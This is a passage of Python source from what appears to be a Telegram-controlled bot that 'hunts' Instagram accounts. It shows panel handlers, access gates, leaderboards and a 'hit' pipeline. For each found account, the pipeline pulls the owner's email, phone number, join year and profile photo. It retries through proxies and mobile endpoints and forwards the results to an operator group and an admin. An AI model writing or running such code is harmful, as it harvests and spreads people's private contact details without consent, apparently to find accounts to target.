                        "All channels verified — hunting and remote control are unlocked."
                    )
                    toast = "Access unlocked"
                    edit_panel_from_callback(
                        callback,
                        format_action_notice("Verified", detail, "OK"),
                        panel_keyboard("main"),
                        toast=toast,
                        show_alert=True,
                    )
                else:
                    detail = "Joins OK. Next: link your hit group (bot must be admin)."
                    text, kb = admin_gate_reply_for_user(actor)
                    edit_panel_from_callback(
                        callback,
                        text or format_action_notice("Hit group required", detail, "WARN"),
                        kb or hit_group_gate_keyboard(),
                        toast="Link hit group",
                        show_alert=True,
                    )
            else:
                missing = state if isinstance(state, list) else []
                detail = "Join all channels, then verify again."
                if missing:
                    names = ", ".join(
                        f"{r.get('preview_name')} ({r.get('_verify_hint', 'pending')})"
                        for r in missing[:4]
                    )
                    detail = f"Still missing: {names}"
                text, kb = admin_gate_reply_for_user(actor)
                edit_panel_from_callback(
                    callback,
                    text or format_action_notice("Still locked", detail, "WARN"),
                    kb or main_kb,
                    toast="Missing joins",
                    show_alert=True,
                )
            return

        if callback_data == "VERIFY_HITGROUP":
            _chat_id, message_id, _msg = panel_message_from_callback(callback)
            ok, msg = verify_operator_hit_group_access(
                keep_message_id=message_id,
                fast=True,
            )
            if ok:
                edit_panel_from_callback(
                    callback,
                    format_action_notice("Hit group ready", msg, "OK"),
                    panel_keyboard("notice"),
                    toast="Hit group verified",
                    show_alert=True,
                )
            else:
                body = msg if isinstance(msg, str) and "<b>" in msg else format_hit_group_gate_message("not_admin")
                _, kb = admin_gate_reply_for_user(actor)
                edit_panel_from_callback(
                    callback,
                    body,
                    kb or hit_group_gate_keyboard(),
                    toast="Promote bot to admin",
                    show_alert=True,
                )
            return

        if callback_data.startswith("FAVNOTE_YES:"):
            uname = callback_data[12:].strip().lstrip("@")
            set_fav_note_pending(uname)
            answer_callback(callback.get("id"), "Send your note in bot DM")
            send_telegram_text(
                format_panel_header()
                + f"<b>Note for @{html.escape(uname)}</b>\n\n"
                + "Type your note in this chat (max 500 characters).\n"
                + "Send <code>/cancel</code> to skip.",
            )
            return

        if callback_data.startswith("FAVNOTE_NO:"):
            uname = callback_data[11:].strip().lstrip("@")
            clear_fav_note_pending()
            answer_callback(
                callback.get("id"),
                f"@{uname} saved without note",
                show_alert=False,
            )
            return

        if callback_data.startswith("FAV:"):
            uname = callback_data[4:].strip().lstrip("@")
            added, count = toggle_favorite_username(uname)
            label = "★ Saved to favorites" if added else "Removed from favorites"
            answer_callback(
                callback.get("id"),
                f"{label} · {count} total",
                show_alert=False,
            )
            if added:
                send_favorite_note_prompt(uname)
            return

        if TELEGRAM_ENABLED and not operator_bot_commands_allowed(actor):
            text, kb = admin_gate_reply_for_user(actor)
            if not text:
                pass
            else:
                edit_panel_from_callback(
                    callback,
                    text or admin_format_gate_message(),
                    kb or main_kb,
                    toast="Complete setup first",
                    show_alert=True,
                )
                return

        if callback_data == "STATS":
            edit_panel_from_callback(
                callback, format_stats(), main_kb, toast="Stats updated",
            )
        elif callback_data == "CMD_STATUS":
            edit_panel_from_callback(
                callback, format_status_quick(), panel_keyboard("status"), toast="Status",
            )
        elif callback_data == "CMD_API":
            edit_panel_from_callback(
                callback, format_api_quick(), panel_keyboard("api"), toast="API probe",
            )
        elif callback_data == "CMD_CLOUD":
            edit_panel_from_callback(
                callback, format_cloud_quick(), panel_keyboard("cloud"), toast="Cloud",
            )
        elif callback_data == "PAUSE":
            set_paused(True)
            edit_panel_from_callback(
                callback,
                format_pause_resume_confirm(False),
                panel_keyboard("pause_notice"),
                toast="Paused · workers idle",
                show_alert=True,
            )
        elif callback_data == "RESUME":
            set_paused(False)
            access_ok = (
                not is_locally_logged_out()
                and operator_access_ok(actor_id=actor, force=True)
            )
            actually_resumed = access_ok and not _api_auto_paused and pause_event.is_set()
            edit_panel_from_callback(
                callback,
                format_pause_resume_confirm(True),
                panel_keyboard("pause_notice") if access_ok else main_kb,
                toast=(
                    "Resumed"
                    if actually_resumed
                    else ("API offline — start endpoint.py" if _api_auto_paused else "Complete access gate first")
                ),
                show_alert=True,
            )
        elif callback_data == "HITS":
            edit_panel_from_callback(
                callback,
                format_hits_message(),
                panel_keyboard("hits"),
                toast="Captures loaded"
                + (" · live paused" if LIVE_WATCH else ""),
            )
        elif callback_data == "HELP":
            edit_panel_from_callback(
                callback,
                format_help(),
                panel_keyboard("help"),
                toast="Commands",
            )
        elif callback_data == "SETTINGS":
            edit_panel_from_callback(
                callback,
                format_settings(),
                panel_keyboard("settings"),
                toast="Config" + (" · auto-refresh paused" if LIVE_WATCH else ""),
            )
        elif callback_data == "PROFILE":
            edit_panel_from_callback(
                callback,
                format_profile(),
                panel_keyboard("profile"),
                toast="Profile",
            )
        elif callback_data == "LEADERBOARD":
            LEADERBOARD_MODE = "operators"
            edit_panel_from_callback(
                callback,
                format_operator_leaderboard(),
                panel_keyboard("leaderboard"),
                toast="Global operators",
            )
        elif callback_data == "BADGES":
            edit_panel_from_callback(
                callback,
                format_badges(),
                panel_keyboard("profile"),
                toast="Badges",
            )
        elif callback_data == "LB_OPS":
            LEADERBOARD_MODE = "operators"
            edit_panel_from_callback(
                callback,
                format_operator_leaderboard(),
                panel_keyboard("leaderboard"),
                toast="Operators",
            )
        elif callback_data == "LB_SESSIONS":
            LEADERBOARD_MODE = "sessions"
            edit_panel_from_callback(
                callback,
                format_session_leaderboard("all"),
                panel_keyboard("leaderboard"),
                toast="Sessions",
            )
        elif callback_data == "LB_DAY":
            LEADERBOARD_MODE = "sessions"
            edit_panel_from_callback(
                callback,
                format_session_leaderboard("day"),
                panel_keyboard("leaderboard"),
                toast="Today",
            )
        elif callback_data == "LB_WEEK":
            LEADERBOARD_MODE = "sessions"
            edit_panel_from_callback(
                callback,
                format_session_leaderboard("week"),
                panel_keyboard("leaderboard"),
                toast="This week",
            )
        elif callback_data == "LB_ALL":
            LEADERBOARD_MODE = "sessions"
            edit_panel_from_callback(
                callback,
                format_session_leaderboard("all"),
                panel_keyboard("leaderboard"),
                toast="All time",
            )
        elif callback_data == "TOOLS":
            edit_panel_from_callback(
                callback,
                format_panel_header()
                + f"<b>{S['btn_tools']} More</b>\n\n"
                + f"<i>{S['bullet']} Analytics, health, ★ Saved, export, live refresh &amp; log out.</i>",
                panel_keyboard("tools"),
                toast="More" + (" · auto-refresh paused" if LIVE_WATCH else ""),
            )
        elif callback_data == "ANALYTICS":
            edit_panel_from_callback(
                callback,
                format_analytics(),
                panel_keyboard("analytics"),
                toast="Analytics",
            )
        elif callback_data == "HEALTH":
            edit_panel_from_callback(
                callback,
                format_health(),
                panel_keyboard("health"),
                toast="Health check",
            )
        elif callback_data == "EXPORT":
            answer_callback(callback.get("id"), "Sending file…")
            export_hits_archive()
        elif callback_data == "SAVED":
            answer_callback(callback.get("id"), "Sending favorites…")
            export_saved_favorites()
        elif callback_data == "LIVE_ON":
            chat_id, message_id, _ = panel_message_from_callback(callback)
            set_live_watch(True, chat_id, message_id)
            edit_panel_from_callback(
                callback,
                format_stats(),
                main_kb,
                toast="Live ON — use Stats to view",
            )
        elif callback_data == "LIVE_OFF":
            set_live_watch(False)
            edit_panel_from_callback(
                callback,
                format_stats(),
                main_kb,
                toast="Auto-refresh OFF",
            )
        elif callback_data == "RESET_ASK":
            edit_panel_from_callback(
                callback,
                format_reset_confirm(),
                panel_keyboard("reset_confirm"),
                toast="Confirm reset",
            )
        elif callback_data == "RESET_OK":
            reset_session_stats()
            edit_panel_from_callback(
                callback,
                format_action_notice("Stats reset", "Session counters cleared.", "RESET"),
                panel_keyboard("notice"),
                toast="Reset complete",
                show_alert=True,
            )
        elif callback_data == "LOGOUT_ASK":
            edit_panel_from_callback(
                callback,
                format_logout_confirm(),
                panel_keyboard("logout_confirm"),
                toast="Confirm logout",
            )
        elif callback_data == "LOGOUT_CANCEL":
            edit_panel_from_callback(
                callback,
                format_stats(),
                panel_keyboard("main"),
                toast="Logout cancelled",
            )
        elif callback_data == "LOGOUT_OK":
            ok, notice = cmd_logout_operator()
            edit_panel_from_callback(
                callback,
                notice,
                {"inline_keyboard": []},
                toast="Logged out" if ok else "Logout failed",
                show_alert=True,
            )
            if ok:
                preserve_operator_hit_group_for_user()
                finish_operator_logout_session()
        elif callback_data == "MIND":
            bump_min_followers(-5)
            edit_panel_from_callback(
                callback, format_settings(), panel_keyboard("settings"),
                toast=f"Min → {MIN_FOLLOWERS}",
            )
        elif callback_data == "MINU":
            bump_min_followers(5)
            edit_panel_from_callback(
                callback, format_settings(), panel_keyboard("settings"),
                toast=f"Min → {MIN_FOLLOWERS}",
            )
        elif callback_data == "THRU":
            bump_thread_count(5)
            edit_panel_from_callback(
                callback, format_settings(), panel_keyboard("settings"),
                toast=f"Threads → {THREAD_COUNT}",
            )
        else:
            answer_callback(callback.get("id"), "OK")
    elif "message" in update:
        message = update["message"]
        chat = message.get("chat") or {}
        chat_id = str(chat.get("id", ""))
        chat_type = chat.get("type", "")
        text = message.get("text", "") or ""
        actor = telegram_actor_id(update)

        if chat_type == "private":
            if not can_control_operator_bot(actor) or str(actor) != str(chat_id):
                return
            if is_linked_operator(actor) and try_consume_favorite_note_input(text):
                return
            dispatch_bot_command(
                normalize_bot_command_text(text),
                actor,
                chat_id=chat_id,
                chat_type=chat_type,
            )
            return

        if chat_type in ("group", "supergroup"):
            if not can_control_operator_bot(actor):
                return
            norm = normalize_bot_command_text(text)
            if not norm.startswith("/"):
                return
            dispatch_bot_command(
                norm,
                actor,
                chat_id=chat_id,
                chat_type=chat_type,
            )


def is_heavy_bot_command(text):
    lower = normalize_bot_command_text(text or "").strip().lower()
    return lower.startswith("/lookup") or lower.startswith("/gen")


def telegram_send_typing(chat_id=None):
    cid = str(chat_id or operator_reply_chat_id() or TELEGRAM_CHAT_ID or "")
    if cid and TELEGRAM_ENABLED:
        send_telegram_request("sendChatAction", data={"chat_id": cid, "action": "typing"})


def _run_bot_command_safe(text, from_user_id, chat_id=None, chat_type="private"):
    _set_operator_cmd_context(chat_id or TELEGRAM_CHAT_ID, chat_type, from_user_id)
    try:
        telegram_send_typing(chat_id or TELEGRAM_CHAT_ID)
        result = process_bot_command(text, from_user_id)
        if result is None:
            log_event("TG CMD", f"no reply for {text[:40]!r}")
            bot_command_reply(
                format_action_notice(
                    "No reply",
                    "Command ran but Telegram send failed — check log.txt · retry.",
                    "WARN",
                ),
                reply_markup=panel_keyboard("notice"),
            )
    except Exception as exc:
        log_event("TG CMD", str(exc)[:120])
        append_error_log("TG CMD", str(exc))
        bot_command_reply(
            format_action_notice("Command error", str(exc)[:100], "ERR"),
            remove_markup=True,
        )
    finally:
        _clear_operator_cmd_context()


def process_hit_group_group_command(command, from_user_id, group_chat_id):
    """Hit-group setup in the group itself (DM inbox ignores group messages)."""
    op = str(TELEGRAM_CHAT_ID or "").strip()
    actor = str(from_user_id or "").strip()
    group_chat_id = str(group_chat_id or "").strip()
    if not op or not group_chat_id:
        return None
    if not can_control_operator_bot(actor):
        return bot_command_reply(
            format_action_notice(
                "Hit group",
                "Only the linked operator or admin can run this in the group.",
                "WARN",
            ),
            chat_id=group_chat_id,
        )
    head = _telegram_command_head(command)
    lower = (command or "").strip().lower()
    if head in ("/hitgroup", "/setgroup") or lower in ("hitgroup", "setgroup"):
        return bot_command_reply(
            format_hit_group_setup_message(),
            reply_markup=hit_group_gate_keyboard(),
            chat_id=group_chat_id,
        )
    if head == "/verifyhitgroup" or lower in ("verifyhitgroup",):
        ok, msg = verify_operator_hit_group_access(fast=True, group_id=group_chat_id)
        if ok:
            return bot_command_reply(
                format_action_notice("Hit group verified", msg, "OK"),
                reply_markup=panel_keyboard("notice"),
                chat_id=group_chat_id,
            )
        reason = "not_admin" if get_operator_hit_group_id() else "no_hit_group"
        body = msg if isinstance(msg, str) and "<b>" in msg else format_hit_group_gate_message(reason)
        return bot_command_reply(body, reply_markup=hit_group_gate_keyboard(), chat_id=group_chat_id)
    return None


def _run_hit_group_group_command_safe(text, from_user_id, group_chat_id):
    try:
        process_hit_group_group_command(text, from_user_id, group_chat_id)
    except Exception as exc:
        log_event("TG HITGRP", str(exc)[:120])
        bot_command_reply(
            format_action_notice("Hit group error", str(exc)[:100], "ERR"),
            chat_id=group_chat_id,
        )


FAST_ACK_COMMANDS = {
    "/start": ("Loading", "Opening welcome panel…"),
    "/check": ("Checking", "Running full health diagnostic…"),
    "/verifyhitgroup": ("Verifying", "Checking bot admin rights in this group…"),
    "/hitgroup": ("Hit group", "Opening setup guide…"),
    "/setgroup": ("Hit group", "Opening setup guide…"),
}


def _poll_instant_command_ack(update):
    """Fire ack on poll thread before any queue — user sees reply in ~1s."""
    if "message" not in update:
        return
    message = update["message"]
    text = message.get("text", "") or ""
    norm = normalize_bot_command_text(text)
    if not norm.startswith("/"):
        return
    head = _telegram_command_head(norm)
    pair = FAST_ACK_COMMANDS.get(head)
    if not pair:
        return
    chat = message.get("chat") or {}
    chat_id = str(chat.get("id", ""))
    chat_type = chat.get("type", "")
    actor = telegram_actor_id(update)
    _set_operator_cmd_context(chat_id, chat_type, actor)
    try:
        resp = send_telegram_instant(
            format_action_notice(pair[0], pair[1], "INFO"),
            chat_id=chat_id,
        )
        if head == "/start":
            _stash_startup_loading_message(chat_id, resp)
    finally:
        _clear_operator_cmd_context()


def _handle_telegram_update_safe(update):
    try:
        handle_telegram_update(update)
    except Exception as exc:
        log_event("TG HANDLER", str(exc)[:120])


def _dispatch_instant_command_ack(text, reply_cid, chat_type, from_user_id):
    """Legacy hook — instant acks are sent on the poll thread (_poll_instant_command_ack)."""
    return


def dispatch_bot_command(text, from_user_id=None, *, chat_id=None, chat_type="private"):
    """Fast commands use tgfast pool; lookup/gen use tgcmd so they never block verify/start."""
    reply_cid = chat_id or TELEGRAM_CHAT_ID
    executor = _tg_cmd_executor if is_heavy_bot_command(text) else _tg_fast_executor
    if is_heavy_bot_command(text):
        _set_operator_cmd_context(reply_cid, chat_type, from_user_id)
        try:
            bot_command_reply(
                format_action_notice(
                    "Processing",
                    "Lookup/gen running — bot stays online. Wait a few seconds…",
                    "INFO",
                ),
                reply_markup=panel_keyboard("notice"),
                chat_id=reply_cid,
            )
        finally:
            _clear_operator_cmd_context()
    executor.submit(
        _run_bot_command_safe, text, from_user_id, reply_cid, chat_type,
    )


def poll_telegram_updates():
    global LAST_UPDATE_ID
    while TELEGRAM_ENABLED:
        try:
            response = telegram_poll_get_updates(LAST_UPDATE_ID + 1)
            if response is None or not response.ok:
                time.sleep(BOT_POLL_INTERVAL)
                continue
            payload = response.json()
            if not payload.get("ok"):
                err = payload.get("description", "")
                if "Conflict" in str(err) or response.status_code == 409:
                    log_event(
                        "TG POLL",
                        "409 conflict — stop other joint.py copies; BotFather webhook OFF",
                    )
                time.sleep(BOT_POLL_INTERVAL)
                continue
            updates = payload.get("result", [])
            for update in updates:
                LAST_UPDATE_ID = max(LAST_UPDATE_ID, update["update_id"])
                _poll_instant_command_ack(update)
                _tg_fast_executor.submit(_handle_telegram_update_safe, update)
        except Exception as exc:
            log_event("TG POLL", str(exc)[:120])
            time.sleep(BOT_POLL_INTERVAL)


def report(username, info):
    try:
        _report_impl(username, info)
    except Exception as exc:
        log_event("HIT REPORT", f"@{username} {str(exc)[:100]}")
        append_error_log("HIT REPORT", str(exc), f"user=@{username}")


def _hit_enrich_minimal_finalize(username, info):
    """Fast path when enrich pool is saturated — upgrade group alert if already sent."""
    info = dict(info or {})
    contact_details = _hit_contact_seed_from_info(info)
    try:
        contact_details = _fetch_hit_contact_wbloks(username, info)
    except Exception as exc:
        log_event("HIT ENRICH", f"@{username} minimal contact {str(exc)[:60]}")
    caption, keyboard, photo_bytes, content_type, quality_stars, name, posts_display, contact_details = (
        _compose_hit_group_message(username, info, contact_details)
    )
    delivered, msg_id, is_photo, _tg_mode = _hit_upgrade_group_message(
        username, caption, keyboard, photo_bytes, content_type,
    )
    if not delivered:
        _hit_tg_rate_wait()
        delivered, msg_id, is_photo = deliver_hit_to_operator_group(
            caption, keyboard, photo_bytes, content_type,
        )
    if not delivered:
        _enqueue_hit_tg_retry(username, caption, keyboard, photo_bytes, content_type)
    elif msg_id:
        gid = get_operator_hit_group_id()
        if gid:
            _hit_tg_cache_put(username, gid, msg_id, is_photo)
    timestamp = datetime.now(timezone.utc).strftime("%d %b %Y • %H:%M UTC")
    profile_url = f"https://www.instagram.com/{html.escape(username)}"
    _write_hit_file_entry(
        username, name,
        info.get("follower_count", "N/A"),
        info.get("following_count", "N/A"),
        posts_display,
        _format_hit_quality_display(quality_stars),
        contact_details, profile_url, timestamp,
    )
    log_event("HIT ENRICH", f"@{username} minimal finalize · TG queued/sent")


def _queue_hit_archive_side_effects(
    username, info, contact_details, profile_url, timestamp,
    quality_stars, quality_display, name, posts_display,
    caption_final, photo_bytes, content_type,
):
    """File/cloud/admin off hot path — never blocks TG edit or hunt."""
    payload = (
        username, dict(info or {}), dict(contact_details or {}),
        profile_url, timestamp, quality_stars, quality_display,
        name, posts_display, caption_final, photo_bytes, content_type,
    )

    def _run():
        try:
            _hit_archive_side_effects_impl(*payload)
        except Exception as exc:
            log_event("HIT FILE", f"@{username} archive {str(exc)[:60]}")

    try:
        _hit_upgrade_executor.submit(_run)
    except Exception:
        threading.Thread(
            target=_run, daemon=True, name=f"hit-arch-{username[:8]}",
        ).start()


def _hit_archive_side_effects_impl(
    username, info, contact_details, profile_url, timestamp,
    quality_stars, quality_display, name, posts_display,
    caption_final, photo_bytes, content_type,
):
    _write_hit_file_entry(
        username, name,
        info.get("follower_count", "N/A"),
        info.get("following_count", "N/A"),
        posts_display,
        quality_display, contact_details, profile_url, timestamp,
    )
    profile_record_hit_quality(quality_stars)
    if TELEGRAM_ENABLED:
        _queue_hit_admin_notify(
            username, caption_final, photo_bytes, content_type, info,
        )


def _hit_deliver_and_archive(username, info, contact_details, profile_url, timestamp):
    """TG pool — caption edit only; archive/cloud deferred."""
    info = dict(info or {})
    contact_details = dict(contact_details or {})
    caption_final, hit_keyboard, photo_bytes, content_type, quality_stars, name, posts_display, contact_details = (
        _compose_hit_group_message(username, info, contact_details)
    )
    quality_display = _format_hit_quality_display(quality_stars)

    delivered, msg_id, is_photo, tg_mode = _hit_upgrade_group_message(
        username, caption_final, hit_keyboard, photo_bytes, content_type,
    )
    if not delivered:
        delivered, msg_id, is_photo = _deliver_hit_group_guaranteed(
            username, info, contact_details,
        )
        tg_mode = "new" if delivered else "fail"
    if delivered and msg_id:
        gid = get_operator_hit_group_id()
        if gid:
            _hit_tg_cache_put(username, gid, msg_id, is_photo)
        if tg_mode == "edited":
            log_event("HIT TG", f"@{username} edited · group")
        elif tg_mode == "unchanged":
            log_event("HIT TG", f"@{username} same caption · deep pending")
        elif tg_mode == "resent":
            log_event("HIT TG", f"@{username} resent · group")
        else:
            log_event("HIT TG", f"@{username} enriched · group")
    else:
        log_event("HIT FAIL", f"@{username} group send queued for retry")

    log_event("HIT ENRICH", f"@{username} done · {quality_display}")
    _queue_hit_archive_side_effects(
        username, info, contact_details, profile_url, timestamp,
        quality_stars, quality_display, name, posts_display,
        caption_final, photo_bytes, content_type,
    )


def _queue_hit_pfp_upgrade(username, info, msg_id, caption, keyboard, is_photo, photo_bytes):
    def _run():
        pfp = _profile_pic_url_from_ig_info(info, username) or "N/A"
        if pfp == "N/A" or not photo_bytes:
            return
        try:
            if _IS_TERMUX:
                full_photo, full_ctype = _quick_hit_pfp_bytes(pfp)
            else:
                full_photo, full_ctype, _ = _fetch_hit_profile_photo_bytes(
                    username, info, pfp,
                )
            if full_photo:
                _finalize_hit_operator_delivery(
                    get_operator_hit_group_id(), msg_id, caption,
                    keyboard, is_photo, full_photo, full_ctype,
                )
        except Exception as exc:
            log_event("PFP FETCH", f"@{username} async {str(exc)[:60]}")

    try:
        _hit_upgrade_executor.submit(_run)
    except Exception:
        threading.Thread(target=_run, daemon=True, name=f"hit-pfp-{username[:8]}").start()


def _queue_hit_admin_notify(username, caption, photo_bytes, content_type, info):
    def _run():
        try:
            admin_load_settings()
            admin_forward_hit_to_group(
                caption,
                photo_bytes=photo_bytes,
                content_type=content_type,
                operator_id=resolve_operator_id(TELEGRAM_CHAT_ID),
            )
            admin_notify_hit_summary(
                username,
                info.get("follower_count", "N/A"),
                info.get("following_count", "N/A"),
                operator_id=resolve_operator_id(TELEGRAM_CHAT_ID),
            )
        except Exception as exc:
            log_event("ADMIN HIT", str(exc)[:80])

    try:
        _hit_upgrade_executor.submit(_run)
    except Exception:
        threading.Thread(target=_run, daemon=True, name=f"hit-admin-{username[:8]}").start()


def _queue_hit_deep_when_idle(username, info, contact_details, profile_url, timestamp):
    """Hold deep enrich until hunt cools — avoids proxy/graphql stalls during gen."""
    row = {
        "username": username,
        "info": dict(info or {}),
        "contact_details": dict(contact_details or {}),
        "profile_url": profile_url,
        "timestamp": timestamp,
        "at": time.time(),
    }
    with _hit_deep_idle_lock:
        if len(_hit_deep_idle_queue) >= 40:
            _hit_deep_idle_queue.pop(0)
        _hit_deep_idle_queue.append(row)
    log_event("HIT ENRICH", f"@{username} deep held — hunt active")


def _queue_hit_contact_retry(username, info, contact_details, profile_url, timestamp):
    """Re-run wbloks when enrich missed contacts — keep going through network blips."""
    payload = (username, dict(info or {}), dict(contact_details or {}), profile_url, timestamp)

    def _run():
        uname, ig_info, details, purl, ts = payload
        merged = dict(details)
        time.sleep(_HIT_CONTACT_BG_RETRY_SLEEP_SEC)
        last_err = None
        for attempt in range(1, _HIT_CONTACT_BG_RETRY_ATTEMPTS + 1):
            try:
                fresh = _fetch_hit_contact_wbloks(uname, ig_info)
                if fresh.get("email"):
                    merged["email"] = fresh["email"]
                if fresh.get("phone"):
                    merged["phone"] = fresh["phone"]
                if not merged.get("joined"):
                    joined = _joined_year_from_ig_info(ig_info)
                    if joined:
                        merged["joined"] = joined
                if merged.get("email") or merged.get("phone"):
                    _schedule_hit_tg_deliver(uname, ig_info, merged, purl, ts)
                    log_event(
                        "HIT ENRICH",
                        f"@{uname} contact retry #{attempt} · upgraded",
                    )
                    return
                if attempt < _HIT_CONTACT_BG_RETRY_ATTEMPTS:
                    wait = _HIT_CONTACT_BG_RETRY_SLEEP_SEC
                    log_event(
                        "HIT ENRICH",
                        f"@{uname} contact retry #{attempt} empty · wait {wait:.0f}s",
                    )
                    time.sleep(wait)
            except Exception as exc:
                last_err = str(exc)[:80]
                log_event("HIT ENRICH", f"@{uname} contact retry #{attempt} {last_err}")
                if attempt < _HIT_CONTACT_BG_RETRY_ATTEMPTS:
                    time.sleep(_HIT_CONTACT_BG_RETRY_SLEEP_SEC)
        log_event(
            "HIT ENRICH",
            f"@{uname} contact retry exhausted · delivering partial "
            f"({last_err or 'no_contact'})",
        )
        _schedule_hit_tg_deliver(uname, ig_info, merged, purl, ts)

    try:
        _hit_upgrade_executor.submit(_run)
    except Exception:
        threading.Thread(target=_run, daemon=True, name=f"hit-ctretry-{username[:8]}").start()


def _drain_hit_deep_idle_queue(max_items=2):
    """Run queued deep enriches; contact retries proceed even during active hunt."""
    batch = []
    with _hit_deep_idle_lock:
        idx = 0
        while idx < len(_hit_deep_idle_queue) and len(batch) < max_items:
            row = _hit_deep_idle_queue[idx]
            cd = row.get("contact_details") or {}
            need_contact = not (cd.get("email") or cd.get("phone"))
            if _hunt_gen_recently_active(90) and not need_contact:
                idx += 1
                continue
            batch.append(_hit_deep_idle_queue.pop(idx))
    for row in batch:
        try:
            _hit_upgrade_executor.submit(
                _hit_deep_enrich_upgrade,
                row["username"],
                row["info"],
                row["contact_details"],
                row["profile_url"],
                row["timestamp"],
            )
        except Exception as exc:
            log_event("HIT BG", f"@{row['username']} deep drain {str(exc)[:60]}")


def _hit_deep_enrich_upgrade(username, info, contact_details, profile_url, timestamp):
    """Slow mobile/posts enrich — upgrades an already-delivered group alert."""
    if _hunt_gen_recently_active(90):
        _queue_hit_deep_when_idle(username, info, contact_details, profile_url, timestamp)
        return
    info = dict(info or {})
    contact_details = dict(contact_details or {})
    need_mobile = not (contact_details.get("email") and contact_details.get("phone"))
    need_posts = _posts_count_from_ig_info(info) is None
    if not need_mobile and not need_posts:
        return
    mobile_timeout = 50 if _IS_TERMUX else 90
    posts_timeout = 40 if _IS_TERMUX else 45
    try:
        with ThreadPoolExecutor(max_workers=2) as deep_pool:
            futures = {}
            if need_mobile:
                futures["mobile"] = deep_pool.submit(
                    _fetch_hit_contact_mobile, username, info, contact_details,
                )
            if need_posts:
                futures["posts"] = deep_pool.submit(
                    _resolve_hit_posts_count, username, dict(info),
                )
            if "mobile" in futures:
                try:
                    contact_details = (
                        futures["mobile"].result(timeout=mobile_timeout) or contact_details
                    )
                except Exception as exc:
                    log_event("HIT BG", f"@{username} mobile {str(exc)[:60]}")
            if "posts" in futures:
                try:
                    info = futures["posts"].result(timeout=posts_timeout) or info
                except Exception as exc:
                    log_event("HIT ENRICH", f"@{username} posts {str(exc)[:80]}")
    except Exception as exc:
        log_event("HIT ENRICH", f"@{username} deep {str(exc)[:80]}")
    if not contact_details.get("joined"):
        joined = _joined_year_from_ig_info(info)
        if joined:
            contact_details["joined"] = joined
    try:
        _schedule_hit_tg_deliver(
            username, dict(info), dict(contact_details), profile_url, timestamp,
        )
    except Exception as exc:
        log_event("HIT BG", f"@{username} deep upgrade {str(exc)[:60]}")


def _hit_full_upgrade_pipeline(username, info):
    """All enrich + TG upgrade on dedicated pool — never competes with active hunt."""
    info = dict(info or {})
    info = _merge_ig_info_profile_fields(info, username)
    profile_url = f"https://www.instagram.com/{html.escape(username)}"
    timestamp = datetime.now(timezone.utc).strftime("%d %b %Y • %H:%M UTC")
    contact_details = _hit_contact_seed_from_info(info)
    light_only = _hit_pipeline_light_only()
    hunt_sem_held = False
    if light_only:
        hunt_sem_held = _hit_during_hunt_sem.acquire(blocking=True, timeout=60)
        if not hunt_sem_held:
            log_event("HIT ENRICH", f"@{username} deferred — hunt priority")
            try:
                threading.Timer(
                    3.0,
                    lambda u=username, i=dict(info): _queue_hit_upgrade_pipeline(u, i),
                ).start()
            except Exception:
                pass
            return
    skip_gw = not _IS_TERMUX
    profile_timeout = min(_HIT_PROFILE_SYNC_TIMEOUT, 8 if not _IS_TERMUX else _HIT_PROFILE_SYNC_TIMEOUT)

    try:
        if light_only:
            info = _merge_ig_info_profile_fields(info, username)
            if _posts_count_from_ig_info(info) is None:
                try:
                    info = _resolve_hit_posts_count(username, info, max_rounds=1)
                except Exception as exc:
                    log_event("HIT ENRICH", f"@{username} posts {str(exc)[:80]}")
            if hunt_sem_held:
                _hit_during_hunt_sem.release()
                hunt_sem_held = False
            try:
                contact_details = (
                    _fetch_hit_contact_direct_then_proxy(username, info, hunt_slot=True)
                    or contact_details
                )
            except Exception as exc:
                log_event("HIT ENRICH", f"@{username} contact {str(exc)[:80]}")
        else:
            contact_timeout = _HIT_CONTACT_SYNC_TIMEOUT
            try:
                with ThreadPoolExecutor(max_workers=2) as enrich_pool:
                    fut_contact = enrich_pool.submit(_fetch_hit_contact_fast, username, info)
                    fut_profile = enrich_pool.submit(
                        _enrich_hit_profile_light, username, info, skip_gateway=skip_gw,
                    )
                    try:
                        contact_details = fut_contact.result(timeout=contact_timeout) or contact_details
                    except Exception as exc:
                        log_event("HIT ENRICH", f"@{username} contact {str(exc)[:100]}")
                    try:
                        info = fut_profile.result(timeout=profile_timeout) or info
                    except Exception as exc:
                        log_event("HIT ENRICH", f"@{username} profile {str(exc)[:100]}")
            except Exception as exc:
                log_event("HIT ENRICH", f"@{username} parallel {str(exc)[:100]}")

        if not contact_details.get("joined"):
            joined = _joined_year_from_ig_info(info)
            if joined:
                contact_details["joined"] = joined

        need_contact = not (contact_details.get("email") or contact_details.get("phone"))
        if need_contact:
            log_event("HIT ENRICH", f"@{username} ready — contact retry queued")
            _queue_hit_contact_retry(username, info, contact_details, profile_url, timestamp)
        else:
            log_event("HIT ENRICH", f"@{username} ready — upgrading group alert")
            _schedule_hit_tg_deliver(username, info, contact_details, profile_url, timestamp)

        need_mobile = not (contact_details.get("email") and contact_details.get("phone"))
        need_posts = _posts_count_from_ig_info(info) is None
        if need_mobile or need_posts:
            if light_only or _hunt_gen_recently_active(90):
                _queue_hit_deep_when_idle(
                    username, info, contact_details, profile_url, timestamp,
                )
            else:
                try:
                    _hit_upgrade_executor.submit(
                        _hit_deep_enrich_upgrade,
                        username, dict(info), dict(contact_details), profile_url, timestamp,
                    )
                except Exception as exc:
                    log_event("HIT BG", f"@{username} deep submit {str(exc)[:60]}")
    finally:
        if hunt_sem_held:
            _hit_during_hunt_sem.release()


def _queue_hit_upgrade_pipeline(username, info):
    try:
        _hit_upgrade_executor.submit(_hit_full_upgrade_pipeline, username, dict(info or {}))
    except Exception as exc:
        log_event("HIT BG", f"@{username} upgrade queue {str(exc)[:60]}")
        try:
            threading.Thread(
                target=_hit_full_upgrade_pipeline,
                args=(username, dict(info or {})),
                daemon=True,
                name=f"hit-upg-{username[:10]}",
            ).start()
        except Exception as exc2:
            log_event("HIT BG", f"@{username} upgrade fallback {str(exc2)[:60]}")


def _hit_enrich_finalize_background(username, info):
    """Thin dispatcher — all work runs on hitupgrade pool."""
    _queue_hit_upgrade_pipeline(username, info)


def _report_impl(username, info):
    """Instant hit + stats; TG/enrich/pfp fully in background — hunt never waits."""
    global hit
    info = _merge_ig_info_profile_fields(info, username)
    followers = info.get("follower_count", "N/A")
    posts_raw = _posts_count_from_ig_info(info)
    posts_display = str(posts_raw) if posts_raw is not None else "N/A"

    with lock:
        hit += 1
    event_message = f"HIT @{username} | {followers} followers | {posts_display} posts"
    log_event("HIT", event_message)
    if not JACK_PANEL_LIVE:
        print(apply_color(event_message, ANSI_GREEN))

    _queue_hit_tg_chain(username, info)

    try:
